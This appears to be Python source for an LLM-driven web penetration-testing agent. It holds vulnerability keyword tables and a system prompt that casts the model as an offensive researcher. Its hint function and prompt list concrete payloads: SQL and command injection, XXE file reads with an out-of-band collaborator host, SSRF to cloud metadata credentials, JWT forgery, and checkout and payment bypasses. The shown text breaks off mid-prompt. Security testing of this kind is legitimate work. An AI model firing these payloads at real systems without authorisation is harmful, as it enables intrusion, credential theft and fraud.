from src.agents.base import BaseAgent
from src.core.workspace import WorkspaceManager
import json
import re
from urllib.parse import urlparse, parse_qs


# ---------------------------------------------------------------------------
# Semantic keyword tables — application-agnostic
# These apply to ANY web application, not a specific framework or CTF target.
# ---------------------------------------------------------------------------

# URL path segment keywords → (vuln_type, severity, cvss_score, cvss_vector)
PATH_KEYWORD_MAP = [
    # keyword            vuln_type                               sev         score  vector
    (r"login|signin|auth|logon",
     "Authentication Bypass / Brute Force",     "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"register|signup|create.?account",
     "Insecure Registration / Account Enumeration", "Medium", 5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    (r"upload|attach|import|file",
     "Unrestricted File Upload",                "Critical", 9.0, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"),
    (r"admin|manage|dashboard|panel|backoffice|staff|superuser",
     "Broken Access Control",                   "Critical", 9.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"search|find|query|filter|lookup",
     "XSS / SQL Injection via Search",          "High",    7.2, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"),
    (r"api|v1|v2|v3|graphql|rest|endpoint",
     "API Security (IDOR / Auth / Injection)",  "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"redirect|goto|return|next|callback|forward",
     "Open Redirect / SSRF",                    "Medium",  6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    (r"download|export|report|backup",
     "Path Traversal / Sensitive File Exposure","High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"/image\b|/img\b|/images\b|/static\b|/assets\b|/files\b|/media\b|/uploads\b|/serve\b|/fetch\b",
     "Path Traversal via File-Serving Endpoint","High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"comment|message|post|feedback|guestbook|review|forum|board",
     "Stored XSS",                              "High",    8.2, "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N"),
    (r"password|reset|forgot|recover",
     "Account Takeover / Weak Password Reset",  "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"profile|account|settings|preferences|user",
     "IDOR / Privilege Escalation",             "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"),
    (r"webhook|notify|hook|ping",
     "SSRF via Webhook",                        "High",    8.6, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"),
    (r"include|template|render|view|layout|theme",
     "SSTI / Local File Inclusion",             "Critical",9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    (r"debug|test|dev|status|health|trace|info",
     "Information Disclosure",                  "Medium",  5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    (r"exec|execute|run|cmd|shell|command|ping",
     "Command Injection / RCE",                 "Critical",9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    (r"sql|query|db|database",
     "SQL Injection",                           "Critical",9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    (r"csrf|token|nonce",
     "Cross-Site Request Forgery",              "Medium",  6.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"),
    (r"cart|order|checkout|payment|purchase|price",
     "Business Logic / Price Tampering",        "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"),
    (r"refund|return|chargeback|dispute|reversal",
     "Business Logic / Refund Abuse",           "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"),
    (r"coupon|voucher|promo|discount|gift.?card|redeem",
     "Business Logic / Coupon & Discount Abuse","High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"),
    (r"inventory|stock|quantity|warehouse|fulfill",
     "Business Logic / Inventory Manipulation", "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"),
    (r"shipping|delivery|address|billing|wallet|credit",
     "IDOR / Business Logic on Shipping/Billing","High",   7.5, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"),
    (r"subscription|plan|tier|upgrade|downgrade|trial",
     "Business Logic / Subscription Bypass",    "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"),
    (r"captcha|recaptcha",
     "Insecure CAPTCHA",                        "Medium",  5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"),
    # --- XML / XXE ---
    (r"xml|soap|wsdl|xmlrpc|rss|atom|sitemap\.xml|api.*xml|stock.*check|check.*stock",
     "XXE Injection",                           "Critical", 9.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    # --- PortSwigger extended attack classes ---
    (r"graphql|gql|__schema|introspect",
     "GraphQL API Injection / Introspection",   "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"oauth|authorize|openid|.well-known/openid",
     "OAuth / OIDC Misconfiguration",           "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"),
    (r"cache|purge|cdn|varnish|surrogate",
     "Web Cache Poisoning / Deception",         "High",    8.0, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"),
    (r"2fa|mfa|otp|totp|authenticator|two.factor",
     "2FA / MFA Bypass",                        "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"),
    (r"websocket|socket\.io|sockjs|ws$|wss$",
     "WebSocket Security",                      "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"llm|ai.chat|copilot|assistant|prompt|generate|completion|embedding",
     "LLM / AI Prompt Injection",               "High",    8.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"),
    (r"nosql|mongo|dynamo|couchdb|firebase",
     "NoSQL Injection",                         "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"prototype|__proto__|gadget|marshal",
     "Prototype Pollution / Deserialization",   "High",    7.5, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"),
    (r"smuggl|tunnel|desync|h2|http2|cl\.te|te\.cl",
     "HTTP Request Smuggling",                  "High",    8.1, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"),
    (r"race|concurren|parallel|simultaneous",
     "Race Condition",                          "High",    7.5, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"),
]

# URL query parameter names → (vuln_type, severity, cvss_score, cvss_vector)
PARAM_KEYWORD_MAP = [
    (r"^id$|^uid$|^user_id$|^object_id$|^item_id$|^pid$|^oid$|^cid$|^rid$",
     "IDOR / SQL Injection via ID Parameter",   "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"),
    (r"page|file|filename|path|include|dir|folder|template|doc|load|download|serve",
     "Local File Inclusion / Path Traversal",   "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"img|image|photo|pic|picture|avatar|thumb|thumbnail|banner|icon|media|asset|static|resource|view",
     "Path Traversal via Image / Media Parameter", "High", 7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"url|redirect|next|return|goto|target|callback|dest",
     "Open Redirect / SSRF",                    "Medium",  6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    (r"cmd|exec|command|shell|run|ping|ip|host",
     "Command Injection",                       "Critical",9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    (r"q|search|query|keyword|name|input|text|msg|message|subject",
     "XSS / SQL Injection via Input",           "High",    7.2, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"),
    (r"username|user|login|email",
     "SQL Injection / Brute Force via Credentials", "High",7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"sort|order|orderby|column|field|by",
     "SQL Injection via ORDER BY",              "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"format|type|output|mode|lang|locale",
     "Content Injection / Parameter Tampering", "Medium",  5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
    # PortSwigger extended
    (r"xml|data|body|payload|content|soap|entity|dtd",
     "XXE / XML Injection via Parameter",       "Critical", 9.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"redirect_uri|client_id|response_type|grant_type|access_token|code$|state$|nonce$|scope$",
     "OAuth / OIDC Parameter Tampering",        "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"),
    (r"host|x.forwarded.host|x.original.url|x.rewrite.url|x.host",
     "HTTP Host Header Injection",              "High",    7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    (r"__proto__|prototype|constructor",
     "Prototype Pollution",                     "High",    7.5, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"),
    (r"where|ne|gt|lt|gte|lte|in|nin|regex|exists|elemMatch",
     "NoSQL Injection via Operator",            "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"kid|jwk|jku|alg|typ|x5u|x5c",
     "JWT Header Injection",                    "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    (r"mutation|subscription|query|__typename|fragment",
     "GraphQL Injection",                       "High",    8.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
]

# Form input name/type patterns → vuln_type
FORM_INPUT_MAP = [
    (r"username|user|login|email",               "password|pass",   "Authentication Bypass / Brute Force / SQLi"),
    (r"file|upload|attach",                      None,              "Unrestricted File Upload"),
    (r"message|comment|body|content|text|post",  None,              "Stored XSS"),
    (r"url|link|href|src|target",                None,              "SSRF / Open Redirect"),
    (r"cmd|command|exec|shell|ping|ip",          None,              "Command Injection"),
    (r"id|uid|user_id|account_id",               None,              "IDOR / Parameter Tampering"),
    (r"price|amount|qty|quantity|discount",      None,              "Business Logic / Price Tampering"),
    (r"coupon|coupon_code|promo_code|voucher|gift_card|redeem_code", None, "Business Logic / Coupon Abuse"),
    (r"refund|refund_amount|credit|chargeback",  None,              "Business Logic / Refund Abuse"),
    (r"shipping|shipping_id|address_id|billing", None,              "IDOR / Shipping & Billing Tampering"),
    (r"stock|inventory|available|units_left",    None,              "Business Logic / Inventory Manipulation"),
    (r"plan|tier|subscription|trial|upgrade",    None,              "Business Logic / Subscription Bypass"),
    (r"token|csrf|nonce|_token",                 "hidden",          "CSRF Token Exposure"),
    (r"otp|totp|code|verification|2fa|mfa|pin",  None,              "2FA / MFA Bypass"),
    (r"query|mutation|graphql|__typename",        None,              "GraphQL Injection"),
    (r"prompt|instruction|context|system.?msg|ai.?input|llm",  None, "LLM Prompt Injection"),
    (r"redirect_uri|client_id|scope|grant.?type|access.?token", None, "OAuth Parameter Tampering"),
    (r"race|coupon|voucher|promo|apply|claim|redeem", None,         "Race Condition / Coupon Abuse"),
    (r"refund|return|chargeback",                None,              "Business Logic / Refund Abuse"),
    (r"stock|inventory|available",               None,              "Business Logic / Inventory Manipulation"),
    (r"shipping|billing|address",                None,              "IDOR / Address Tampering"),
    (r"total|subtotal|tax|fee|surcharge",        None,              "Business Logic / Price Tampering"),
    (r"plan|tier|subscription|upgrade|trial",    None,              "Business Logic / Subscription Bypass"),
]

# Missing security header → (title, cvss_score, cvss_vector, details)
HEADER_VULN_MAP = {
    "x-frame-options":          ("Missing X-Frame-Options — Clickjacking",             4.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", "The application does not set X-Frame-Options, allowing it to be embedded in iframes and enabling clickjacking attacks."),
    "content-security-policy":  ("Missing Content-Security-Policy",                   5.4, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Absence of CSP allows XSS payloads to execute without restriction."),
    "x-content-type-options":   ("Missing X-Content-Type-Options — MIME Sniffing",     4.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", "Without nosniff, browsers may interpret files as a different MIME type enabling MIME-based attacks."),
    "strict-transport-security":("Missing Strict-Transport-Security (HSTS)",           6.5, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", "Without HSTS, the site is vulnerable to SSL-stripping and downgrade attacks."),
    "referrer-policy":          ("Missing Referrer-Policy — Referrer Leakage",         3.7, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N", "Without a Referrer-Policy, sensitive URL parameters may leak to third parties via the Referer header."),
    "permissions-policy":       ("Missing Permissions-Policy",                         3.1, "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:N", "No Permissions-Policy allows unrestricted access to browser features (camera, geolocation, etc.)."),
    "x-xss-protection":         ("Missing X-XSS-Protection",                          4.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", "Old browsers may lack built-in XSS filter protection without this header."),
}


def _build_tech_wstg_hints(tech_stack: list) -> str:
    """Return WSTG-based test case hints tailored to the detected tech stack.

    Each technology maps to the most impactful WSTG test cases and specific
    payloads/checks that the LLM should prioritise during hypothesis generation.
    """
    if not tech_stack:
        return ""

    hints: list[str] = []
    stack_lower = [t.lower() for t in tech_stack]

    def _matches(*keywords):
        return any(kw in s for kw in keywords for s in stack_lower)

    if _matches("php"):
        hints.append(
            "PHP detected → WSTG-INPV-11 (LFI/RFI): test ?page=../../etc/passwd, "
            "?file=php://filter/convert.base64-encode/resource=index.php; "
            "WSTG-INPV-05 (SQLi): test with ' OR 1=1--, SLEEP(5), boolean-based blind; "
            "WSTG-ATHZ-02: PHP sessions may be predictable — test PHPSESSID manipulation."
        )
    if _matches("wordpress", "wp-", "woocommerce"):
        hints.append(
            "WordPress detected → test /wp-json/wp/v2/users (user enumeration); "
            "xmlrpc.php bruteforce/SSRF; wp-admin/admin-ajax.php unauthenticated endpoints; "
            "WooCommerce: price=0 on checkout, coupon stacking, order IDOR via /wp-json/wc/v3/orders/<id>."
        )
    if _matches("django", "python"):
        hints.append(
            "Django/Python detected → SSTI: test {{7*7}}, {{config}}, {{settings.SECRET_KEY}}; "
            "WSTG-INPV-18: check for debug mode (?debug=true, /500 error page leaking stack trace); "
            "CSRF exemptions on API views; insecure deserialization via pickle."
        )
    if _matches("flask"):
        hints.append(
            "Flask detected → SSTI via Jinja2: test {{7*7}}, {{''.__class__.__mro__[1].__subclasses__()}}; "
            "debug mode check: append /__debugger__ or trigger 500 for Werkzeug PIN; "
            "SECRET_KEY brute-force for session forgery."
        )
    if _matches("node", "express", "javascript", "js"):
        hints.append(
            "Node.js/Express detected → WSTG-INPV-19 prototype pollution: "
            "test __proto__[polluted]=1 in JSON body and query params; "
            "SSRF via URL parsing quirks (0x7f000001, [::1]); "
            "path traversal via %2e%2e%2f on static file endpoints."
        )
    if _matches("react", "angular", "vue", "spa", "next.js", "nuxt"):
        hints.append(
            "SPA framework detected → WSTG-CLNT-01 DOM XSS: check location.hash, "
            "location.search sinks, innerHTML, dangerouslySetInnerHTML; "
            "client-side routing may expose hidden admin routes — enumerate JS bundle for /admin /internal; "
            "JWT in localStorage: test alg:none, weak HS256 secrets."
        )
    if _matches("spring", "java", "tomcat", "struts"):
        hints.append(
            "Java/Spring detected → WSTG-INPV-11 SpEL injection: test ${7*7} in form fields; "
            "Java deserialization: check for ysoserial gadget chains on serialized object endpoints; "
            "Spring Actuator: /actuator/env, /actuator/heapdump, /actuator/beans; "
            "Struts: test Content-Type header injection."
        )
    if _matches("rails", "ruby"):
        hints.append(
            "Ruby on Rails detected → SSTI: test <%= 7*7 %> in template params; "
            "mass assignment: add admin=true or role=admin to JSON bodies; "
            "Rails CSRF: check for protect_from_forgery bypass in API controllers."
        )
    if _matches("graphql"):
        hints.append(
            "GraphQL detected → WSTG-APIT: run introspection query {__schema{types{name}}}; "
            "test for batch query abuse (send 100 login mutations); "
            "IDOR via direct object references in query args; "
            "nested query DoS: deeply nested { user { friends { friends { ... } } } }."
        )
    if _matches("mysql", "mariadb"):
        hints.append(
            "MySQL/MariaDB detected → SQLi payloads: ' OR SLEEP(5)-- , "
            "' UNION SELECT 1,2,@@version,4-- , "
            "GROUP_CONCAT(table_name) FROM information_schema.tables-- ; "
            "stacked queries with ; DROP/INSERT; load_file() for LFI."
        )
    if _matches("postgresql", "postgres"):
        hints.append(
            "PostgreSQL detected → SQLi: '; SELECT pg_sleep(5)-- , "
            "' UNION SELECT NULL,version()-- , COPY TO/FROM for RCE (if superuser); "
            "test for pg_read_file('/etc/passwd')."
        )
    if _matches("nginx", "apache"):
        hints.append(
            "Web server misconfiguration checks → WSTG-CONF-05: test path traversal on static dirs; "
            "HTTP verb tampering (PUT/DELETE on static resources); "
            "server-status/server-info endpoints; .htaccess / .nginx.conf exposure; "
            "alias traversal: /static../etc/passwd."
        )
    if _matches("jwt"):
        hints.append(
            "JWT detected → test alg:none attack (remove signature); "
            "weak secret brute-force (use 'secret', 'password', app name); "
            "kid header injection (kid: ../../dev/null for null-byte secret); "
            "WSTG-SESS-10: test JWT without expiry claim."
        )
    if _matches("oauth", "openid", "sso"):
        hints.append(
            "OAuth/SSO detected → WSTG-ATHZ-05: state parameter CSRF bypass; "
            "redirect_uri manipulation (add extra path, use open redirect); "
            "authorization code reuse; implicit flow token leakage in Referer."
        )
    if _matches("s3", "aws", "cloudfront", "azure", "gcp"):
        hints.append(
            "Cloud provider detected → SSRF to metadata: "
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/; "
            "http://metadata.google.internal/computeMetadata/v1/ (X-Google-Metadata-Request: True); "
            "S3 bucket enumeration: test s3://<appname>; check for public ACL on bucket."
        )

    if not hints:
        return ""

    return (
        "\n=== DYNAMIC WSTG HINTS (based on detected tech stack) ===\n"
        + "\n".join(f"  • {h}" for h in hints)
        + "\nPrioritise hypotheses targeting these technology-specific attack surfaces.\n"
    )


def _severity_from_score(score: float) -> str:
    """Derive the correct CVSS 3.1 severity label from a numeric base score.

    CVSS 3.1 official ranges:
      0.0        → None  (reported as "Informational" for pentest purposes)
      0.1 – 3.9  → Low
      4.0 – 6.9  → Medium
      7.0 – 8.9  → High
      9.0 – 10.0 → Critical
    """
    try:
        s = float(score)
    except (TypeError, ValueError):
        return "Informational"
    if s == 0.0:
        return "Informational"
    if s <= 3.9:
        return "Low"
    if s <= 6.9:
        return "Medium"
    if s <= 8.9:
        return "High"
    return "Critical"


class VulnAnalyzerAgent(BaseAgent):
    def __init__(self, engine, max_llm_hypotheses: int = 15):
        super().__init__(engine)
        self.max_llm_hypotheses = max_llm_hypotheses
        self.system_prompt = (
            "You are an elite, offensive security researcher and penetration tester with full knowledge of the "
            "OWASP Top 10 (2021), WSTG v4.2, and real-world exploitation techniques.\n\n"

            "=== CONTEXT ===\n"
            "Deterministic structural hypotheses have already been injected from recon data (links, forms, headers). "
            "The ALREADY COVERED section lists what was captured automatically. "
            "Your job is to reason deeply about the application and add what structural analysis CANNOT detect.\n\n"

            "=== OWASP TOP 10 — MANDATORY COVERAGE ===\n"
            "For each category below, generate at least one hypothesis IF the recon data shows any related "
            "endpoint, parameter, form, or technology hint. Be specific — include exact payloads and parameters.\n\n"

            "A01 — Broken Access Control\n"
            "  • IDOR: iterate numeric IDs (e.g. ?id=1→2→3), UUID enumeration\n"
            "  • Forced browsing: access /admin, /dashboard, /api/users without auth\n"
            "  • Privilege escalation: change role=user to role=admin in request body\n"
            "  • HTTP method override: use X-HTTP-Method-Override: DELETE on GET endpoints\n"
            "  • Path traversal: ../../etc/passwd, /....//....//etc/passwd\n\n"

            "A02 — Cryptographic Failures\n"
            "  • Sensitive data in HTTP (not HTTPS), cleartext credentials in responses\n"
            "  • Weak hashing (MD5/SHA1 in cookies or tokens)\n"
            "  • JWT with alg:none or weak secret (HS256 brute-forceable)\n"
            "  • Hardcoded API keys or secrets exposed in JS files or HTML source\n\n"

            "A03 — Injection\n"
            "  • SQL Injection: ' OR '1'='1'-- , ' OR 1=1-- , 1; DROP TABLE--, UNION SELECT payloads\n"
            "  • Blind SQLi: 1 AND SLEEP(5)--, 1' AND 1=1-- vs 1' AND 1=2--\n"
            "  • Command Injection: ; whoami,|whoami, | id, && cat /etc/passwd, `id`\n"
            "  • LDAP Injection: *)(uid=*))(|(uid=*, admin)(&)\n"
            "  • NoSQL Injection: {'$gt':''}, {'$where':'sleep(1000)'}\n"
            "  • XPath Injection: ' or '1'='1, ' or ''='\n"
            "  • SSTI: {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, *{7*7}\n"
            "  • Header Injection: X-Forwarded-For, Host header manipulation\n\n"

            "A04 — Insecure Design\n"
            "  • Business logic: negative quantities, price=0 or price=-1, skip payment steps\n"
            "  • Workflow bypass: jump from step 1 to step 3 in multi-step processes\n"
            "  • Mass assignment: inject hidden fields (is_admin=1, role=admin, verified=true)\n"
            "  • Rate limiting absence: test for account lockout bypass on login/reset forms\n\n"

            "A05 — Security Misconfiguration\n"
            "  • HTTP methods enabled: OPTIONS/PUT/DELETE/TRACE/CONNECT via curl -X\n"
            "  • Directory listing: append / to directories, test /backup/, /.git/, /.env\n"
            "  • Default credentials on login forms (admin/admin, admin/password, root/root)\n"
            "  • Error pages revealing stack traces, file paths, framework versions\n"
            "  • CORS misconfiguration: Origin: https://evil.com — check Access-Control-Allow-Origin\n\n"

            "A06 — Vulnerable and Outdated Components\n"
            "  • If server version is disclosed, research CVEs for that exact version\n"
            "  • jQuery < 3.5.0 → XSS via html(); Angular < 1.6 → template injection\n"
            "  • Outdated CMS plugins (WordPress, Drupal) → known RCE/SQLi CVEs\n\n"

            "A07 — Identification and Authentication Failures\n"
            "  • Brute force login: no lockout after N failures\n"
            "  • Credential stuffing: common password list (admin/admin, test/test, guest/guest)\n"
            "  • Session fixation: set SESSIONID= before login and check if it persists\n"
            "  • Predictable session tokens: observe pattern across multiple logins\n"
            "  • Password reset: poisoning via Host header, token reuse, no expiry\n"
            "  • Remember-me token: decode and check for predictability\n\n"

            "A08 — Software and Data Integrity Failures\n"
            "  • Insecure deserialization: PHP unserialize(), Java ObjectInputStream, Python pickle\n"
            "  • Subresource integrity missing on CDN scripts (inspect <script src=...>)\n"
            "  • Auto-update mechanisms fetching from HTTP (not HTTPS)\n\n"

            "A09 — Security Logging and Monitoring Failures\n"
            "  • Test if failed login attempts generate an alert (purely observational)\n"
            "  • Check if WAF/IDS is present by injecting obvious payloads and observing blocking\n\n"

            "A10 — Server-Side Request Forgery (SSRF)\n"
            "  • Inject internal URLs: http://127.0.0.1, http://169.254.169.254/latest/meta-data/\n"
            "  • Bypass filters: http://2130706433 (decimal IP), http://0x7f000001, http://localhost\n"
            "  • Cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "  • DNS rebinding: use SSRF-test services\n\n"

            "=== ADDITIONAL ATTACK CLASSES (WSTG + PortSwigger) ===\n"
            "  \u2022 XSS Reflected: URL params, search boxes, canonical tags, JS template literals\n"
            "  \u2022 XSS Stored: comment/profile/message/review fields; Stored DOM XSS via JSON sinks\n"
            "  \u2022 DOM XSS: location.search/hash, document.write, innerHTML, jQuery sinks, AngularJS $eval\n"
            "  \u2022 CSRF: missing token; token not tied to session; SameSite=None cookie; Referer bypass\n"
            "  \u2022 Clickjacking: iframe embedding; prefilled input via URL params; multistep clickjacking\n"
            "  \u2022 Open Redirect: ?redirect=//evil.com; ?url=javascript:; chained with OAuth token theft\n"
            "  \u2022 LFI: ?page=../../etc/passwd; php://filter/convert.base64-encode/resource=index; null byte %00\n"
            "  \u2022 File Upload: .php5/.phtml; null byte; double extension .jpg.php; polyglot; race condition upload\n"
            "  \u2022 XXE: if any endpoint accepts XML (Content-Type: application/xml) or has XML-like params, ALWAYS generate XXE hypothesis\n"
            "    Look for: stock check, order, cart, product, API endpoints that POST data\n"
            "    Payload: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><item>&xxe;</item></root>\n"
            "    Blind XXE: SYSTEM \"http://YOUR-COLLABORATOR/\" — check for DNS/HTTP OOB interaction\n"
            "    XInclude bypass: <xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"file:///etc/passwd\"/>\n"
            "    Image upload XXE: embed DOCTYPE in SVG/XML-based image file\n"
            "    Error-based: <!ENTITY xxe SYSTEM \"file:///nonexistent\"> — error reveals internal paths\n"
            "  \u2022 HTTP Request Smuggling: CL.TE; TE.CL; obfuscated TE; H2.CL; H2.TE; CRLF injection; CL.0\n"
            "  \u2022 Web Cache Poisoning: X-Forwarded-Host; X-Original-URL; fat GET; param cloaking; cache key injection\n"
            "  \u2022 Web Cache Deception: /account/..%2Fstatic.css; path delimiter abuse; normalization mismatch\n"
            "  \u2022 CORS: ACAO reflects origin; trusted null; trusted http subdomain; pre-flight bypass\n"
            "  \u2022 HTTP Host Header: password reset poisoning; Host: internal; routing-based SSRF; dangling markup\n"
            "  \u2022 OAuth: implicit flow token exfil; redirect_uri manipulation; state CSRF; open redirect chaining\n"
            "  \u2022 JWT: alg=none; weak HS256 brute-force; jwk/jku injection; kid path traversal; RS256 to HS256 confusion\n"
            "  \u2022 GraphQL: introspection (__schema); IDOR via query args; batch brute-force; CSRF over mutation\n"
            "  \u2022 NoSQL: JSON operator injection gt/ne/where; $regex field enum; auth bypass via operator\n"
            "  \u2022 Prototype Pollution: __proto__[admin]=true (client); server-side PP via JSON merge patch; PP to RCE\n"
            "  \u2022 Race Conditions: limit overrun (coupon/voucher reuse); partial construction; time-sensitive bypass\n"
            "  \u2022 WebSockets: CSWSH hijacking; inject malicious ws frames; handshake header manipulation\n"
            "  \u2022 2FA Bypass: skip /2fa step; brute-force OTP; reuse used token; response manipulation\n"
            "  \u2022 Password Reset: poisoning via Host header; token reuse/no expiry; dangling markup injection\n"
            "  \u2022 Web LLM: prompt injection; indirect injection via retrieved docs; excessive agency exploitation\n"
            "  \u2022 Path Traversal: ../../../../etc/passwd; %2e%2e encoding; superfluous decode; null byte; extension bypass\n"
            "  \u2022 API Testing: hidden endpoints via docs; mass assignment; server-side param pollution; unused HTTP methods\n\n"

            "=== E-COMMERCE / BUSINESS LOGIC (WSTG-BUSL) ===\n"
            "If the target has ANY of: cart, order, checkout, payment, product, coupon, refund, shipping, subscription\n"
            "endpoints or parameters, ALWAYS generate hypotheses for the following:\n\n"
            "  PRICE & CART MANIPULATION\n"
            "  • Price tampering: modify price/total/amount in POST body → price=0, price=-1, price=0.001\n"
            "  • Negative quantity: qty=-1 to receive refund credit; qty=0 to get item at no cost\n"
            "  • Integer overflow: qty=2147483648, price=9999999999 — causes wrap-around to 0 or negative\n"
            "  • Hidden field injection: add hidden form fields discount=100, is_free=true, price_override=0\n"
            "  • Mass assignment on add-to-cart: inject extra fields (discount_percent, staff_price, free_shipping=true)\n\n"
            "  COUPON & DISCOUNT ABUSE\n"
            "  • Coupon stacking: apply the same coupon code multiple times in one order\n"
            "  • Expired coupon: use coupon_code=SAVE50 after expiry — check if server validates expiry\n"
            "  • Negative discount: discount_amount=-50 to add credit instead of reducing price\n"
            "  • Race condition — concurrent coupon redemption: submit two requests simultaneously to redeem a single-use coupon twice\n\n"
            "  WORKFLOW & PAYMENT BYPASS\n"
            "  • Skip payment step: after adding to cart, navigate directly to /order/confirm or /order/complete without going through /checkout/payment\n"
            "  • Force payment status: modify payment_status=paid or status=completed in request body\n"
            "  • Two-step bypass: complete step 1 (address), then jump directly to step 3 (confirmation) skipping step 2 (payment)\n\n"
            "  IDOR ON ORDER/CART/ADDRESS\n"
            "  • Order IDOR: GET /api/orders/{id} — iterate ID to view other users' orders\n"
            "  • Cart IDOR: GET /api/carts/{id}/items — access another user's cart\n"
            "  • Address IDOR: GET/PUT /api/addresses/{id} — read or modify another user's shipping/billing address\n\n"
            "  REFUND & INVENTORY ABUSE\n"
            "  • Refund abuse: POST /refund with amount=-100 to gain store credit; re-submit already-refunded order\n"
            "  • Stock deduction race: concurrent purchase requests when stock=1 — two orders may succeed\n"
            "  • Inventory manipulation: set quantity beyond stock limit; negative stock value\n\n"
            "  SUBSCRIPTION / PLAN BYPASS\n"
            "  • Downgrade with premium features: downgrade plan but retain access to premium endpoints\n"
